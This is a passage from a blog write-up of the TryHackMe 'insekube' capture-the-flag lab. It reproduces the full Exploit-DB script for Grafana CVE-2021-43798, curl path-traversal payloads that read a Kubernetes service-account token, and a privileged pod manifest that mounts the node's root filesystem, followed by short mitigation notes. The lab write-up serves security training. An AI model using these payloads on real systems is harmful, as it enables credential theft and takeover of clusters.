</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
flag<span class="o">{</span>Redacted<span class="o">}</span>
</pre></table></code></div></div><p>Once we’re done enumerating kubernetes, we can start enumerating the internal grafana service as below.</p><h3 id="enumerating-grafana-for-lateral-movement">Enumerating grafana for lateral movement<a href="#enumerating-grafana-for-lateral-movement" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>curl http://grafana:3000
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--     0
100    29  100    29    0     0   7250      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--  7250
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"/login"</span><span class="o">&gt;</span>Found&lt;/a&gt;.
</pre></table></code></div></div><p>A <code class="language-plaintext highlighter-rouge">/login</code> endpoint is found and grafana can be further enumerated to find the version of grafana running on the cluster to search for any CVEs.</p><p><img data-src="https://bn1304files.storage.live.com/y4mo0vshNXtQZ2LsIiDlvlSJGXm758rOcP9YxoFXI4kudQbxWuWiQJLypqxn9Ct_PpTtqCwJzwUkMrvAQgMhE5a4NOJ8DyOnBHNRvz0DrhoMsMUxlACA-wkhOQ4590phTxw0EnRq18ojLHNtg_C6PE3DpTpUKAUZ35FT1HNfpus8PEshFbFP62PFFsz3B-coPPp?width=2858&amp;height=1284&amp;cropmode=none" alt="Insert grafana version photo here" data-proofer-ignore></p><p>Sure enough, there is a <a href="https://www.exploit-db.com/exploits/50581">CVE-2021-43798</a> for Gravana v8.3.0-beta2 and a POC script available on exploit DB. Using this vulnerability, we will be able to extract a JWT token of grafana service account.</p><p>Kubernetes stores token of a service account running the pod in <code class="language-plaintext highlighter-rouge">/var/run/secrets/kubernetes.io/serviceaccount/token</code></p><p>An LFI payload can be sent to internal grafana service with the grafana URL and above kubernetes secret path to extract the token.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
</pre><td class="rouge-code"><pre><span class="c1"># Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
# Date: 08/12/2021
# Exploit Author: s1gh
# Vendor Homepage: https://grafana.com/
# Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
# Version: V8.0.0-beta1 through V8.3.0
# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.
# CVE: CVE-2021-43798
# Tested on: Debian 10
# References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p
</span>
<span class="c1">#!/usr/bin/env python3
# -*- coding: utf-8 -*-
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">choice</span>

<span class="n">plugin_list</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">"alertlist"</span><span class="p">,</span>
    <span class="s">"annolist"</span><span class="p">,</span>
    <span class="s">"barchart"</span><span class="p">,</span>
    <span class="s">"bargauge"</span><span class="p">,</span>
    <span class="s">"candlestick"</span><span class="p">,</span>
    <span class="s">"cloudwatch"</span><span class="p">,</span>
    <span class="s">"dashlist"</span><span class="p">,</span>
    <span class="s">"elasticsearch"</span><span class="p">,</span>
    <span class="s">"gauge"</span><span class="p">,</span>
    <span class="s">"geomap"</span><span class="p">,</span>
    <span class="s">"gettingstarted"</span><span class="p">,</span>
    <span class="s">"grafana-azure-monitor-datasource"</span><span class="p">,</span>
    <span class="s">"graph"</span><span class="p">,</span>
    <span class="s">"heatmap"</span><span class="p">,</span>
    <span class="s">"histogram"</span><span class="p">,</span>
    <span class="s">"influxdb"</span><span class="p">,</span>
    <span class="s">"jaeger"</span><span class="p">,</span>
    <span class="s">"logs"</span><span class="p">,</span>
    <span class="s">"loki"</span><span class="p">,</span>
    <span class="s">"mssql"</span><span class="p">,</span>
    <span class="s">"mysql"</span><span class="p">,</span>
    <span class="s">"news"</span><span class="p">,</span>
    <span class="s">"nodeGraph"</span><span class="p">,</span>
    <span class="s">"opentsdb"</span><span class="p">,</span>
    <span class="s">"piechart"</span><span class="p">,</span>
    <span class="s">"pluginlist"</span><span class="p">,</span>
    <span class="s">"postgres"</span><span class="p">,</span>
    <span class="s">"prometheus"</span><span class="p">,</span>
    <span class="s">"stackdriver"</span><span class="p">,</span>
    <span class="s">"stat"</span><span class="p">,</span>
    <span class="s">"state-timeline"</span><span class="p">,</span>
    <span class="s">"status-histor"</span><span class="p">,</span>
    <span class="s">"table"</span><span class="p">,</span>
    <span class="s">"table-old"</span><span class="p">,</span>
    <span class="s">"tempo"</span><span class="p">,</span>
    <span class="s">"testdata"</span><span class="p">,</span>
    <span class="s">"text"</span><span class="p">,</span>
    <span class="s">"timeseries"</span><span class="p">,</span>
    <span class="s">"welcome"</span><span class="p">,</span>
    <span class="s">"zipkin"</span>
<span class="p">]</span>


<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.'</span><span class="p">}</span>

    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">file_to_read</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'Read file &gt; '</span><span class="p">)</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">host</span> <span class="o">+</span> <span class="s">'/public/plugins/'</span> <span class="o">+</span> \
                <span class="n">choice</span><span class="p">(</span><span class="n">plugin_list</span><span class="p">)</span> <span class="o">+</span> \
                <span class="s">'/../../../../../../../../../../../../..'</span> <span class="o">+</span> <span class="n">file_to_read</span>
            <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">method</span><span class="o">=</span><span class="s">'GET'</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
            <span class="n">prep</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">prepare</span><span class="p">()</span>
            <span class="n">prep</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">prep</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>

            <span class="k">if</span> <span class="s">'Plugin file not found'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">'[-] File not found</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="s">'[-] Something went wrong.'</span><span class="p">)</span>
                    <span class="k">return</span>
        <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">ConnectTimeout</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'[-] Request timed out. Please check your host settings.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
            <span class="k">pass</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
        <span class="n">description</span><span class="o">=</span><span class="s">"Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read"</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-H'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'host'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Target host"</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">return</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></table></code></div></div><p>From the POC exploit, we can see that the LFI payload can be crafted as below to this endpoint. This will read the secret (in JWT format) of an escalated service account.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">--path-as-is</span> http://grafana:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
</pre></table></code></div></div><p>As the shell is not too stable, the token is saved into an environment variable as below.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">export token=$</span><span class="o">(</span>curl <span class="nt">--path-as-is</span> http://grafana:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token<span class="o">)</span>
</pre></table></code></div></div><p>We can now interact kubernetes with an escalated service account.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">./kubectl auth can-i --list --token=$</span><span class="o">{</span>token<span class="o">}</span>
<span class="go">Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
</span></pre></table></code></div></div><p>From the pods, we can see that there is a grafana pod running. With the secret we got earlier, we should be able to break into that pod and check for any sensitive data we can use to escalate further.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">./kubectl get pods --token=$</span><span class="o">{</span>token<span class="o">}</span>
<span class="go">NAME                       READY   STATUS    RESTARTS       AGE
grafana-57454c95cb-v4nrk   1/1     Running   10 (25d ago)   49d
syringe-79b66d66d7-7mxhd   1/1     Running   1 (25d ago)    25d
</span></pre></table></code></div></div><p>The service account we’re using is developer.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">./kubectl get serviceaccount --token=$</span><span class="o">{</span>token<span class="o">}</span>
<span class="go">NAME        SECRETS   AGE
default     1         49d
developer   1         49d
syringe     1         49d
</span></pre></table></code></div></div><p>Breaking into grafana pod and looking at environment variables. ;)</p><div class="language-console highlighter-rouge"><div class="code-header"> <span label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="gp">./kubectl exec -it grafana-57454c95cb-v4nrk --token=$</span><span class="o">{</span>token<span class="o">}</span> <span class="nt">--</span> /bin/bash
<span class="go">hostname
grafana-57454c95cb-v4nrk
env
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.10.151.225
KUBERNETES_SERVICE_PORT=443
HOSTNAME=grafana-57454c95cb-v4nrk
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.10.151.225:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.10.151.225:3000
PWD=/usr/share/grafana
GF_PATHS_HOME=/usr/share/grafana
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/grafana
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
FLAG=flag{redacted}
SHLVL=1
SYRINGE_PORT_3000_TCP_PORT=3000
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
GF_PATHS_DATA=/var/lib/grafana
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GF_PATHS_LOGS=/var/log/grafana
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GRAFANA_PORT_3000_TCP_ADDR=10.10.151.225
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
</span></pre></table></code></div></div><h3 id="escalating-to-the-node-with-bad-pod">Escalating to the node with bad pod<a href="#escalating-to-the-node-with-bad-pod" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Having admin access to the cluster allows a user to create any resources at will. <a href="https://bishopfox.com/blog/kubernetes-pod-privilege-escalation">This article</a> explains how to get access to the kubernetes nodes by running a pod that mounts the node’s file system.</p><p>A bad pod can be created based on the yaml file below. Do note that as the cluster might not have internet connectivity, you can set the variable <code class="language-plaintext highlighter-rouge">imagePullPolicy: IfNotPresent</code> to firstly pull the image from local cluster.</p><div class="language-yaml highlighter-rouge"><div class="code-header"> <span label-text="YAML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>
<span class="na">metadata</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">everything-allowed-exec-pod</span>
  <span class="na">labels</span><span class="pi">:</span>
    <span class="na">app</span><span class="pi">:</span> <span class="s">pentest</span>
<span class="na">spec</span><span class="pi">:</span>
  <span class="na">hostNetwork</span><span class="pi">:</span> <span class="no">true</span>
  <span class="na">hostPID</span><span class="pi">:</span> <span class="no">true</span>
  <span class="na">hostIPC</span><span class="pi">:</span> <span class="no">true</span>
  <span class="na">containers</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">everything-allowed-pod</span>
    <span class="na">image</span><span class="pi">:</span> <span class="s">ubuntu</span>
    <span class="na">imagePullPolicy</span><span class="pi">:</span> <span class="s">IfNotPresent</span>
    <span class="na">securityContext</span><span class="pi">:</span>
      <span class="na">privileged</span><span class="pi">:</span> <span class="no">true</span>
    <span class="na">volumeMounts</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/host</span>
      <span class="na">name</span><span class="pi">:</span> <span class="s">noderoot</span>
    <span class="na">command</span><span class="pi">:</span> <span class="pi">[</span> <span class="s2">"</span><span class="s">/bin/sh"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">-c"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">--"</span> <span class="pi">]</span>
    <span class="na">args</span><span class="pi">:</span> <span class="pi">[</span> <span class="s2">"</span><span class="s">while</span><span class="nv"> </span><span class="s">true;</span><span class="nv"> </span><span class="s">do</span><span class="nv"> </span><span class="s">sleep</span><span class="nv"> </span><span class="s">30;</span><span class="nv"> </span><span class="s">done;"</span> <span class="pi">]</span>
  <span class="c1">#nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name</span>
  <span class="na">volumes</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">noderoot</span>
    <span class="na">hostPath</span><span class="pi">:</span>
      <span class="na">path</span><span class="pi">:</span> <span class="s">/</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh"> &gt;&gt;privesc.yml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
</span><span class="no">EOF
</span>./kubectl apply <span class="nt">-f</span> privesc.yml <span class="nt">--token</span><span class="o">=</span><span class="k">${</span><span class="nv">token</span><span class="k">}</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./kubectl <span class="nb">exec</span> <span class="nt">-it</span> everything-allowed-exec-pod <span class="nt">--token</span><span class="o">=</span><span class="k">${</span><span class="nv">token</span><span class="k">}</span> <span class="nt">--</span> /bin/bash
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>find <span class="nb">.</span> <span class="nt">-name</span> <span class="s2">"root.txt"</span>
</pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/pids/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/pids'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/perf_event/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/perf_event'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/memory/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/memory'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/cpuset/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/cpuset'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/net_cls,net_prio/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/net_cls,net_prio'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/freezer/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/freezer'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/blkio/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/blkio'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/hugetlb/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/hugetlb'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/cpu,cpuacct/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/cpu,cpuacct'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/devices/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/devices'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/sys/fs/cgroup/systemd/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e'</span> is part of the same file system loop as <span class="s1">'./host/sys/fs/cgroup/systemd'</span><span class="nb">.</span>
<span class="gp">find: File system loop detected;</span><span class="w"> </span><span class="s1">'./host/var/lib/docker/overlay2/7f3ea4e7c6e133fafbdf9883b717a65f552dda89b37e0e86be3a072532c5feeb/merged'</span> is part of the same file system loop as <span class="s1">'.'</span><span class="nb">.</span>
<span class="go">./host/root/root.txt
</span></pre></table></code></div></div><p>Root flag can be found from the enumeration and the cluster is pwned. Now what’s the point of all this if you do not know how to mitigate these attacks to protect your organization or business as a blue teamer.</p><h2 id="defending-against-lfi-on-your-web-service-application-security">Defending against LFI on your web service (Application Security)<a href="#defending-against-lfi-on-your-web-service-application-security" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>To eliminate the risk of LFI attacks, the recommended approach is to disallow or prevent user-submitted input from being passed to any filesystem or framework API in your application. If that isn’t possible, you need to sanitize all such inputs. This is a great article that documents the mitigation methods in details to defend against LFI.</p><p><a href="https://www.pivotpointsecurity.com/blog/file-inclusion-vulnerabilities/">https://www.pivotpointsecurity.com/blog/file-inclusion-vulnerabilities/</a></p><h2 id="defending-against-lateral-movements-and-privilege-escalation-from-pod-to-node-cluster-component-security">Defending against lateral movements and privilege escalation from pod to node (Cluster component security)<a href="#defending-against-lateral-movements-and-privilege-escalation-from-pod-to-node-cluster-component-security" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>To defend against lateral movements and privesc, the services and dependencies running within the cluster needs to be constantly monitored for any CVEs by using vulnerability scanners like <a href="https://kube-hunter.aquasec.com">kube hunter</a> and <a href="https://docs.snyk.io/products/snyk-container/getting-started-snyk-container">Snyk Container scanner</a></p><h2 id="conclusion">Conclusion<a href="#conclusion" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Thank you for reading. Do note that this writeup only covered a small subset of the Cluster, Container and Application security components of Kubernetes and there are a lot more parts that needs to be secured. Here are the sources mentioned in the writeup.</p><p><a href="https://tryhackme.com/room/insekube">https://tryhackme.com/room/insekube</a></p><p><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux">https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux</a></p><p><a href="https://bishopfox.com/blog/kubernetes-pod-privilege-escalation">https://bishopfox.com/blog/kubernetes-pod-privilege-escalation</a></p><p><a href="https://docs.snyk.io/products/snyk-container/getting-started-snyk-container">https://docs.snyk.io/products/snyk-container/getting-started-snyk-container</a></p><p><a href="https://kube-hunter.aquasec.com">https://kube-hunter.aquasec.com</a></p><p><a href="https://www.pivotpointsecurity.com/blog/file-inclusion-vulnerabilities/">https://www.pivotpointsecurity.com/blog/file-inclusion-vulnerabilities/</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/cloud-security/'>Cloud-Security</a>, <a href='/categories/kubernetes/'>Kubernetes</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/cloud-security/" class="post-tag 